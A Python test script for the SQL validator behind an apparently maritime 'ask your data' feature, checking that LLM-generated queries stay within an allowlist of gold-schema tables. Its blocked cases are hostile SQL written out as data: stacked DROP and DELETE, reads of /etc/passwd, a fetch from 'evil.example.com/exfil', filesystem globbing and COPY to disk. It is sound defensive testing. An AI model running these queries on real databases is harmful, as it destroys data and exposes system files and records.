"""Safety tests for ask_data.py — no LLM call needed, pure validation logic.

Each test simulates SQL an LLM *could* plausibly generate, including
malicious or malformed output, and asserts the validator's behaviour.
Updated for the MaritimeGuard AI maritime gold schema.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "serving" / "api"))

from ask_data import UnsafeSQLError, validate_sql  # noqa: E402

ALLOWED = {
    "fct_vessel_positions", "gold.fct_vessel_positions",
    "fct_port_calls", "gold.fct_port_calls",
    "fct_ais_anomalies", "gold.fct_ais_anomalies",
    "dim_vessels", "gold.dim_vessels",
    "dim_ports", "gold.dim_ports",
    "dim_time", "gold.dim_time",
    "dim_weather_zones", "gold.dim_weather_zones",
    "obt_vessel_tracking", "gold.obt_vessel_tracking",
}


def ok(sql, label):
    try:
        result = validate_sql(sql, ALLOWED)
        print(f"[ALLOWED as expected] {label}\n   -> {result}\n")
        return True
    except UnsafeSQLError as e:
        print(f"[UNEXPECTEDLY BLOCKED] {label}\n   -> {e}\n")
        return False


def blocked(sql, label):
    try:
        result = validate_sql(sql, ALLOWED)
        print(f"[UNEXPECTEDLY ALLOWED] {label}\n   -> {result}\n")
        return False
    except UnsafeSQLError as e:
        print(f"[BLOCKED as expected] {label}\n   -> {e}\n")
        return True


results = []

# --- legitimate maritime queries must pass ---
results.append(ok(
    "SELECT vessel_key, count(*) FROM gold.fct_vessel_positions GROUP BY 1",
    "normal aggregate query — vessel position counts"))
results.append(ok(
    "WITH anomalies AS (SELECT * FROM gold.fct_ais_anomalies WHERE risk_score > 80) SELECT * FROM anomalies",
    "CTE referencing an allowed table — high-risk anomalies"))
results.append(ok(
    "select port_name, country from gold.dim_ports where harbor_size = 'Large'",
    "lowercase SELECT on dim_ports"))

# --- classic SQL injection / multi-statement ---
results.append(blocked(
    "SELECT * FROM gold.fct_vessel_positions; DROP TABLE gold.fct_vessel_positions;",
    "stacked query / DROP after semicolon"))
results.append(blocked(
    "SELECT * FROM gold.dim_vessels WHERE 1=1; DELETE FROM gold.dim_vessels",
    "stacked DELETE"))

# --- DDL/DML disguised as a SELECT-adjacent statement ---
results.append(blocked("UPDATE gold.dim_vessels SET vessel_name = 'HACKED'", "raw UPDATE"))
results.append(blocked("INSERT INTO gold.fct_port_calls VALUES (1,2,3)", "raw INSERT"))
results.append(blocked("ATTACH '/etc/passwd' AS pwn", "ATTACH arbitrary file"))
results.append(blocked("PRAGMA database_list", "PRAGMA introspection"))

# --- file/network access disguised as SELECT (the subtle one) ---
results.append(blocked(
    "SELECT * FROM read_csv('/etc/passwd')",
    "read_csv on an arbitrary local file, inside a SELECT"))
results.append(blocked(
    "SELECT * FROM read_json_auto('https://evil.example.com/exfil')",
    "read_json_auto against an external URL"))
results.append(blocked(
    "SELECT * FROM glob('/home/**')",
    "glob filesystem traversal"))
results.append(blocked(
    "COPY (SELECT * FROM gold.fct_vessel_positions) TO '/tmp/out.csv'",
    "COPY to exfiltrate data to disk"))

# --- table allowlist ---
results.append(blocked(
    "SELECT * FROM bronze.raw_vessel_positions",
    "table outside the gold schema (bronze layer)"))
results.append(blocked(
    "SELECT * FROM information_schema.tables",
    "system catalog probing"))
results.append(blocked(
    "SELECT * FROM main.some_other_db.secrets",
    "cross-database reference"))

# --- LIMIT auto-injection ---
sql = validate_sql("SELECT * FROM gold.fct_vessel_positions", ALLOWED)
results.append(("LIMIT" in sql.upper(), "auto-adds LIMIT when missing")[0])
print(f"[{'PASS' if 'LIMIT' in sql.upper() else 'FAIL'}] auto-LIMIT injected -> {sql}\n")

print("=" * 60)
passed, total = sum(bool(r) for r in results), len(results)
print(f"RESULT: {passed}/{total} checks passed")
if passed != total:
    raise SystemExit(1)
